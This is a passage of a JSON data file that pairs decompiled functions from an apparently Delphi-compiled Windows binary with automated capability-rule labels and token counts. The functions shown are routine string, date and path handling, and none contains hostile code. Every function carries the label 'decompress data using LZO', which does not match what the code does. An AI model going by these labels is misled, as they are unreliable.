        "decompiled_code": "\nint32_t * __fastcall fcn.00409754(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405b8c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 - piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 - piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 483
    },
    "004097dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004097dc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    if ((in_EAX != 0) && (iVar1 = *(in_EAX + -4),  iVar1 != 0)) {\n        fcn.00405b8c();\n        iVar2 = *param_2;\n        uVar5 = *(iVar1 + -4 + in_EAX);\n        piVar4 = (((uVar5 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar5 | 0x80808080) ^ uVar5)) >> 2;\n        *(iVar1 + -4 + iVar2) = uVar5 + piVar4;\n        uVar5 = iVar1 - 1U & 0xfffffffc;\n        while (bVar6 = 3 < uVar5,  uVar5 = uVar5 - 4,  bVar6) {\n            uVar3 = *(uVar5 + in_EAX);\n            piVar4 = (((uVar3 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((uVar3 | 0x80808080) ^ uVar3)) >>\n                     2;\n            *(uVar5 + iVar2) = uVar3 + piVar4;\n        }\n        return piVar4;\n    }\n    iVar1 = *param_2;\n    if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n        LOCK();\n        piVar4 = iVar1 + -8;\n        *piVar4 = *piVar4 + -1;\n        if (*piVar4 == 0) {\n            fcn.00402f0c();\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 491
    },
    "00409a20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409a20(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004058fc();\n    fcn.0040555c();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharUpperBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00409a58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409a58(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.004058fc();\n    fcn.0040555c();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharLowerBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00409a90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409a90(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004058fc(param_2);\n    uVar1 = fcn.004058fc(in_EAX, uVar1);\n    iVar2 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    return iVar2 + -2;\n}\n",
        "token_count": 169
    },
    "00409af4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409af4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    for (iVar1 = 1; (iVar1 <= iVar2 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + 1) {\n    }\n    if (iVar2 < iVar1) {\n        fcn.0040546c();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar2) < 0x21; iVar2 = iVar2 + -1) {\n        }\n        fcn.00405964(param_2);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00409b98": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409b98(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    for (; (0 < iVar1 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + -1) {\n    }\n    fcn.00405964(param_2);\n    return;\n}\n",
        "token_count": 124
    },
    "00409bd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409bd0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    uVar4 = 0;\n    pcVar5 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar5 = *(in_EAX + -4);\n    }\n    if (pcVar5 == NULL) {\n        bVar2 = true;\n    }\n    else {\n        cVar1 = *in_EAX;\n        if (((cVar1 + 0xbfU < 0x1a) || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        bVar2 = uVar3 ^ 1;\n    }\n    if (!bVar2) {\n        if (param_2 == '\\0') {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        else {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((cVar1 != '.') && (9 < cVar1 - 0x30U)) &&\n                       ((0x19 < cVar1 + 0xbfU && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 630
    },
    "00409d3c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409d3c(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 423
    },
    "00409f78": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00409f78(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_1h;\n    \n    if (-1 < in_EDX) {\n        var_ch = in_EDX + 1;\n        do {\n            iVar2 = *(arg_8h + -4);\n            iVar3 = *in_EAX;\n            if (iVar2 != 0) {\n                iVar2 = *(iVar2 + -4);\n            }\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar1 = fcn.004058fc(iVar3);\n            fcn.004058fc(iVar2, uVar1);\n            iVar2 = sub.kernel32.dll_CompareStringA_1();\n            if (iVar2 == 2) {\n                return 1;\n            }\n            in_EAX = in_EAX + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "0040a22c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a22c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    char cVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x40a241;\n    fcn.004058ec();\n    uStack32 = 0x40a315;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    if (in_EAX == 0) {\n        puStack28 = &stack0xfffffffc;\n        iVar1 = fcn.0040db2c();\n        *(iVar1 + 0xc) = 3;\n        fcn.00404eb4();\n    }\n    fcn.0040e7f0();\n    fcn.00405504();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (in_EAX < 3) {\n        cVar2 = '\\x01';\n    }\n    else {\n        cVar2 = '\\0';\n        fcn.0040a208();\n    }\n    cVar2 = cVar2 == '\\0';\n    if (cVar2) {\n        fcn.0040a518();\n        fcn.00405894();\n    }\n    else {\n        cVar2 = '\\x01';\n    }\n    if (cVar2 == '\\0') {\n        fcn.0040a518();\n        cVar2 = fcn.0040a22c();\n        if (cVar2 != '\\0') {\n            fcn.0040a830();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40a31c;\n    uStack32 = 0x40a314;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 458
    },
    "0040a490": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040a490(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while (cVar1 = fcn.0040e478(),  cVar1 == '\\x02') {\n        iVar2 = iVar2 + -1;\n    }\n    return in_EAX + -1 + iVar2;\n}\n",
        "token_count": 136
    },
    "0040a4c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a4c4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_2;\n    if (param_2 != 0) {\n        iVar3 = *(param_2 + -4);\n    }\n    fcn.004058fc();\n    do {\n        if (iVar3 < 1) {\n            return iVar3;\n        }\n        if ((*(param_2 + -1 + iVar3) != '\\0') && (iVar2 = fcn.0040aa24(),  iVar2 != 0)) {\n            cVar1 = fcn.0040e478();\n            if (cVar1 != '\\x02') {\n                return iVar3;\n            }\n            iVar3 = iVar3 + -1;\n        }\n        iVar3 = iVar3 + -1;\n    } while( true );\n}\n",
        "token_count": 210
    },
    "0040a54c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a54c(uint param_1, uint param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    if (pcVar1 < 2) {\n        bVar5 = false;\n    }\n    else {\n        bVar5 = in_EAX[1] == ':';\n    }\n    if (bVar5) {\n        fcn.00405964(param_2);\n    }\n    else {\n        pcVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            pcVar1 = *(in_EAX + -4);\n        }\n        if (pcVar1 < 2) {\n            bVar5 = false;\n        }\n        else {\n            bVar5 = *in_EAX == '\\\\';\n        }\n        if (bVar5) {\n            bVar5 = in_EAX[1] == '\\\\';\n        }\n        else {\n            bVar5 = false;\n        }\n        if (bVar5) {\n            iVar3 = 0;\n            iVar4 = 3;\n            while ((iVar2 = fcn.0040572c(),  iVar4 < iVar2 && (iVar3 < 2))) {\n                if (in_EAX[iVar4 + -1] == '\\\\') {\n                    iVar3 = iVar3 + 1;\n                }\n                if (iVar3 < 2) {\n                    iVar4 = iVar4 + 1;\n                }\n            }\n            fcn.00405964(param_2);\n        }\n        else {\n            fcn.0040546c();\n        }\n    }\n    return;\n}\n",
        "token_count": 405
    },
    "0040a90c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040a90c(void)\n\n{\n    fcn.004058fc();\n    fcn.0040a8d8();\n    return;\n}\n",
        "token_count": 36
    },
    "0040a954": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a954(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    param_2 = param_2 - in_EAX;\n    if (param_2 == 0) {\n        return 0;\n    }\n    while( true ) {\n        uVar1 = in_EAX[param_2];\n        uVar3 = uVar1;\n        puVar2 = in_EAX;\n        if ((uVar1 != *in_EAX) || (uVar1 == 0)) break;\n        uVar1 = in_EAX[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[1]) || (uVar1 == 0)) goto code_r0x0040a9d6;\n        uVar1 = in_EAX[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[2]) || (uVar1 == 0)) goto code_r0x0040a9d3;\n        uVar1 = in_EAX[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[3]) goto code_r0x0040a9d0;\n        puVar2 = in_EAX + 4;\n        if (uVar1 == 0) goto code_r0x0040a9cd;\n        uVar1 = puVar2[param_2];\n        uVar3 = uVar1;\n        if ((uVar1 != *puVar2) || (uVar1 == 0)) break;\n        uVar1 = puVar2[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[5]) || (uVar1 == 0)) goto code_r0x0040a9d6;\n        uVar1 = puVar2[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[6]) || (uVar1 == 0)) goto code_r0x0040a9d3;\n        uVar1 = puVar2[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[7]) goto code_r0x0040a9d0;\n        in_EAX = in_EAX + 8;\n        puVar2 = in_EAX;\n        if (uVar1 == 0) goto code_r0x0040a9cd;\n    }\ncode_r0x0040a9d9:\n    return *puVar2 - uVar3;\ncode_r0x0040a9cd:\n    puVar2 = puVar2 + -4;\ncode_r0x0040a9d0:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9d3:\n    puVar2 = puVar2 + 1;\ncode_r0x0040a9d6:\n    puVar2 = puVar2 + 1;\n    goto code_r0x0040a9d9;\n}\n",
        "token_count": 729
    },
    "0040aab4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.0040aab4(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -4) + -4;\n}\n",
        "token_count": 38
    },
    "0040aaec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0040aaec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00402f0c();\n    }\n    return;\n}\n",
        "token_count": 48
    },
    "0040af90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040af90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t arg_10h;\n    uint var_100ch;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EDX;\n    if (in_EDX != 0) {\n        iVar1 = *(in_EDX + -4);\n    }\n    if (iVar1 < 0xc00) {\n        iVar1 = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n        }\n        var_ch = fcn.0040ab84(arg_8h, in_ECX, iVar1);\n        iVar1 = 0x1000;\n    }\n    else {\n        iVar1 = in_EDX;\n        var_ch = in_EDX;\n        if (in_EDX != 0) {\n            iVar1 = *(in_EDX + -4);\n            var_ch = iVar1;\n        }\n    }\n    if (var_ch < iVar1 + -1) {\n        fcn.0040555c();\n    }\n    else {\n        while (iVar1 + -1 <= var_ch) {\n            iVar1 = iVar1 * 2;\n            fcn.0040546c();\n            fcn.00405b8c();\n            arg_10h = in_EDX;\n            if (in_EDX != 0) {\n                arg_10h = *(in_EDX + -4);\n            }\n            var_ch = fcn.0040ab84(arg_8h, in_ECX, arg_10h);\n        }\n        fcn.00405b8c();\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "0040bd14": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd14(uint arg_8h)\n\n{\n    fcn.0040bcd0(arg_8h);\n    return;\n}\n",
        "token_count": 35
    },
    "0040be20": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040be20(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY336;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack300 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack304 = 0x40bf82;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    fcn.0040546c();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    fcn.00405504();\n    uVar1 = fcn.004058fc(&fcn.0040be20::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040be20::var_14h, uVar1);\n    uStackY336 = 0x40bea3;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        uStackY336 = 0x40bebd;\n        fcn.004056dc();\n        if (in_EAX == 1) {\n            if (*0x4958cc == 4) {\n                if (*0x4958d0 == 1) {\n                    uStackY336 = 0x40bf1d;\n                    iVar2 = fcn.0040e4b4();\n                    if (iVar2 == 4) {\n                        fcn.0040e5d0();\n                        fcn.00405664();\n                        fcn.0040e654();\n                        uStackY336 = 0x40bf61;\n                        fcn.0040555c();\n                    }\n                }\n            }\n            else if (*0x4958cc == 0x11) {\n                fcn.0040e654();\n                fcn.00405964();\n                uStackY336 = in_EDX;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStackY336;\n    fcn.0040546c(0x40bf89);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 611
    },
    "0040bf9c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bf9c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char **in_EDX;\n    uint *in_FS_OFFSET;\n    char **ppcStackY332;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack296 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack300 = 0x40c08a;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    fcn.0040546c();\n    var_14h._0_2_ = *(arg_8h + -0xe);\n    var_14h._2_2_ = *(arg_8h + -0x10);\n    var_eh._0_2_ = *(arg_8h + -0x12);\n    if (in_EAX < 3) {\n        fcn.00405504();\n    }\n    else {\n        fcn.00405504();\n    }\n    uVar1 = fcn.004058fc(&fcn.0040bf9c::var_114h, 0x100);\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1(4, &fcn.0040bf9c::var_14h, uVar1);\n    ppcStackY332 = 0x40c02d;\n    iVar2 = sub.kernel32.dll_GetDateFormatA(uVar1);\n    if (iVar2 != 0) {\n        ppcStackY332 = 0x40c043;\n        fcn.004056dc();\n        if ((in_EAX == 1) && (**in_EDX == '0')) {\n            fcn.00405964();\n            ppcStackY332 = in_EDX;\n        }\n    }\n    *in_FS_OFFSET = ppcStackY332;\n    fcn.0040546c(0x40c091);\n    return;\n}\n",
        "token_count": 493
    },
    "0040c980": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c980(int32_t param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x40ca46;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = 0;\n    puVar1 = &stack0xfffffffc;\n    var_8h = param_2;\n    if (param_1 != 0) {\n        fcn.0040c8c8();\n        fcn.00405964(&var_14h);\n        var_10h = var_14h;\n        iVar3 = param_1;\n        if (param_1 != 0) {\n            iVar3 = *(param_1 + -4);\n        }\n        iVar4 = var_14h;\n        if (var_14h != 0) {\n            iVar4 = *(var_14h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar4);\n        uVar2 = fcn.004058fc(iVar3, uVar2);\n        in_stack_ffffffb4 = 0x400;\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        puVar1 = puStack40;\n        if (iVar3 == 2) {\n            if (param_1 != 0) {\n                param_1 = *(param_1 + -4);\n            }\n            *var_8h = *var_8h + param_1;\n            var_9h = 1;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.0040546c(0x40ca4d);\n    return;\n}\n",
        "token_count": 520
    },
    "0040ca58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040ca58(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char cStack16;\n    \n    uVar2 = 0;\n    fcn.0040c8c8();\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if ((*param_2 <= iVar1) && (cStack16 = param_1,  *(in_EAX + -1 + *param_2) == cStack16)) {\n        *param_2 = *param_2 + 1;\n        uVar2 = 1;\n    }\n    return CONCAT44(param_1, uVar2);\n}\n",
        "token_count": 182
    },
    "0040d11c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d11c(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cbd8();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 134
    },
    "0040d154": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nulong fcn.0040d154(void)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    \n    cVar1 = fcn.0040cf24();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX - 4);\n        }\n        uVar2 = in_EAX & 0xffffff00 | in_EAX < 1;\n    }\n    return CONCAT44(1, uVar2);\n}\n",
        "token_count": 133
    },
    "0040d1c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d1c0(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    double dStack28;\n    \n    uVar3 = 1;\n    cVar1 = fcn.0040cbd8();\n    if (cVar1 == '\\0') {\n        uVar2 = 1;\n    }\n    else {\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        if (in_EAX < 1) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = fcn.0040cf24();\n        }\n        uVar2 = uVar2 ^ 1;\n    }\n    if (uVar2 == 0) {\n        if (dStack28 < *0x40d258) {\n            *param_2 = dStack28 - 0.0;\n        }\n        else {\n            *param_2 = dStack28 + 0.0;\n        }\n    }\n    else {\n        uVar3 = fcn.0040d154();\n    }\n    return uVar3;\n}\n",
        "token_count": 274
    },
    "0040d5e4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
